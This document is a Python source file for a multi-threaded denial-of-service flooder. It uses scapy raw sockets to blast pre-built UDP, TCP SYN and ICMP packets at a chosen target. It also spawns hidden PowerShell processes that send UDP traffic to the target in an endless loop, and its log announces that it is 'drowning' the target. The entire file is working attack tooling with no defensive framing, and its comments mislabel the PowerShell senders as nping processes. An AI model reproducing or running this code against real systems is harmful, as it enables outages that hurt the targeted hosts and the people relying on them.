"""
core/flood.py
-------------
Inundador asincrono multi-socket.

Cada FloodWorker es un hilo con SU PROPIO socket L3 raw y un banco de
plantillas IP pre-serializadas (puertos y payload rotativos), de modo
que el bucle interior solo hace sock.send(bytes) sin construir nada.
Se complementa con procesos nping opcionales para picos extra.
"""
from __future__ import annotations

import ctypes
import os
import platform
import random
import signal
import threading
import time
from collections import deque

from . import proc

IS_WIN = platform.system() == "Windows"
PROCESS_TERMINATE = 0x0001

DEFAULT_PAYLOAD = 1400
DEFAULT_TEMPLATES = 64

MODE_UDP = "udp"
MODE_SYN = "tcp_syn"
MODE_ICMP = "icmp"
MODE_MIX = "mix"


def udp_process_cmd(target: str, port: int, payload: int) -> list[str]:
    return ["powershell", "-NoProfile", "-NonInteractive", "-Command",
            "$u=New-Object System.Net.Sockets.UdpClient;"
            f"$u.Connect('{target}',{port});"
            f"$b=New-Object byte[] {payload};"
            "$u.Send($b,$b.Length);"
            "while($true){$u.Send($b,$b.Length)}"]


def _kill_pid(pid: int) -> bool:
    if IS_WIN:
        try:
            h = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                ctypes.windll.kernel32.TerminateProcess(h, 0)
                ctypes.windll.kernel32.CloseHandle(h)
                return True
        except Exception:
            return False
        return False
    try:
        os.killpg(os.getpgid(pid), signal.SIGKILL)
        return True
    except Exception:
        try:
            os.kill(pid, signal.SIGKILL)
            return True
        except Exception:
            return False


class FloodWorker(threading.Thread):
    """Un hilo = un socket L3 raw + banco de tramas pre-serializadas."""

    def __init__(self, target: str, mode: str, payload: int,
                 templates: int, index: int):
        super().__init__(daemon=True, name=f"Flood-{index}")
        self.target = target
        self.mode = mode
        self.payload = payload
        self.templates = templates
        self.index = index
        self.sent = 0
        self.error: str | None = None
        self._stop = threading.Event()
        self._sock = None
        self._use_sock = True

    def stop(self) -> None:
        self._stop.set()

    def _build(self) -> list[bytes]:
        from scapy.all import ICMP, IP, TCP, UDP, Raw
        bank: list[bytes] = []
        base = 40000 + self.index * 1000
        for i in range(self.templates):
            sport = base + (i % 900) + random.randint(0, 99)
            blob = bytes(random.getrandbits(8) for _ in range(min(24, self.payload)))
            if self.mode == MODE_SYN:
                pkt = IP(dst=self.target, ttl=64) / TCP(
                    sport=sport, dport=random.choice((80, 443, 8080)),
                    flags="S", seq=random.randint(1, 2 ** 31))
            elif self.mode == MODE_ICMP:
                pkt = IP(dst=self.target, ttl=64) / ICMP() / blob
            elif self.mode == MODE_MIX:
                if i % 3 == 0:
                    pkt = IP(dst=self.target) / TCP(
                        sport=sport, dport=443, flags="S", seq=random.randint(1, 2 ** 31))
                elif i % 3 == 1:
                    pkt = IP(dst=self.target) / ICMP() / blob
                else:
                    pkt = IP(dst=self.target) / UDP(sport=sport,
                                                    dport=random.randint(1024, 65000)) / blob
            else:
                pkt = IP(dst=self.target) / UDP(sport=sport,
                                                dport=random.randint(1024, 65000)) / blob
            bank.append(bytes(pkt))
        return bank

    def run(self) -> None:
        try:
            from scapy.all import conf
            self._sock = conf.L3socket()
        except Exception as exc:
            self._sock = None
            self._use_sock = False
            self.error = str(exc)

        try:
            bank = self._build()
        except Exception as exc:
            self.error = str(exc)
            return
        if not bank:
            return

        n = len(bank)
        i = 0
        if self._use_sock and self._sock is not None:
            send = self._sock.send
            while not self._stop.is_set():
                try:
                    send(bank[i])
                    self.sent += 1
                except Exception:
                    pass
                i += 1
                if i >= n:
                    i = 0
        else:
            from scapy.all import send as l3send
            while not self._stop.is_set():
                try:
                    l3send(bank[i], verbose=0)
                    self.sent += 1
                except Exception:
                    pass
                i += 1
                if i >= n:
                    i = 0


class FloodEngine:
    """
    Orquestador. Estrategia:
      - N hilos raw (N = optimal_workers) para el nucleo del ataque.
      - M procesos nping opcionales como refuerzo.
    """

    def __init__(self, log=None):
        self.log = log or (lambda m, l="info": None)
        self.target: str | None = None
        self.mode = MODE_UDP
        self.payload = DEFAULT_PAYLOAD
        self.threads = proc.optimal_workers(4, 64)
        self.processes = 0
        self.burst = DEFAULT_TEMPLATES
        self._workers: list[FloodWorker] = []
        self._procs: list = []
        self._lock = threading.Lock()
        self._t0 = 0.0
        self._pps: deque[float] = deque(maxlen=6)
        self._last_sample = 0.0
        self._last_sent = 0

    # ---------------------------------------------------------- estado
    @property
    def running(self) -> bool:
        return bool(self._workers)

    @property
    def alive_threads(self) -> int:
        return sum(1 for w in self._workers if w.is_alive())

    @property
    def sent(self) -> int:
        return sum(w.sent for w in self._workers)

    @property
    def pps(self) -> float:
        return sum(self._pps) / len(self._pps) if self._pps else 0.0

    @property
    def uptime(self) -> float:
        return time.time() - self._t0 if self.running else 0.0

    def strategy_label(self) -> str:
        return f"{self.threads} sockets raw + {self.processes} nping [{self.mode}]"

    # ---------------------------------------------------------- control
    def start(self, target: str, mode: str | None = None, threads: int | None = None,
              payload: int | None = None, processes: int | None = None,
              templates: int | None = None) -> int:
        self.stop(silent=True)

        self.target = target
        self.mode = mode or self.mode
        self.threads = max(1, threads or self.threads)
        self.payload = payload or self.payload
        self.processes = processes if processes is not None else self.processes
        self.burst = templates or self.burst

        self._workers = [
            FloodWorker(target, self.mode, self.payload, self.burst, i)
            for i in range(self.threads)
        ]
        for w in self._workers:
            w.start()

        if self.processes > 0:
            for i in range(self.processes):
                try:
                    self._procs.append(
                        proc.popen_hidden(udp_process_cmd(target, 42000 + i, self.payload)))
                except Exception:
                    pass

        self._t0 = time.time()
        self._last_sample = self._t0
        self._last_sent = 0

        time.sleep(0.5)
        alive = self.alive_threads
        if alive == 0:
            self.log(f"Sin hilos activos contra {target}", "error")
        else:
            self.log(f"AHOGANDO {target} -> {alive} sockets raw "
                     f"[{self.mode}] {self.payload}B"
                     + (f" + {self.processes} nping" if self.processes else ""), "ok")
        return alive

    def stop(self, silent: bool = False) -> int:
        with self._lock:
            workers, procs = self._workers, self._procs
            self._workers, self._procs = [], []

        for w in workers:
            w.stop()
        for w in workers:
            try:
                w.join(timeout=1.5)
            except Exception:
                pass
        for p in procs:
            _kill_pid(p.pid)

        if IS_WIN and proc.which("nping"):
            proc.run_hidden(["taskkill", "/F", "/IM", "nping.exe"], timeout=6)

        n = len(workers) + len(procs)
        if not silent and n:
            self.log(f"Detenido. {n} flujo(s) cerrado(s).", "warn")
        return n

    def sample(self) -> None:
        """Llamado periodicamente desde la GUI para calcular pps real."""
        now = time.time()
        dt = now - self._last_sample
        if dt < 0.4:
            return
        s = self.sent
        self._pps.append((s - self._last_sent) / dt)
        self._last_sent = s
        self._last_sample = now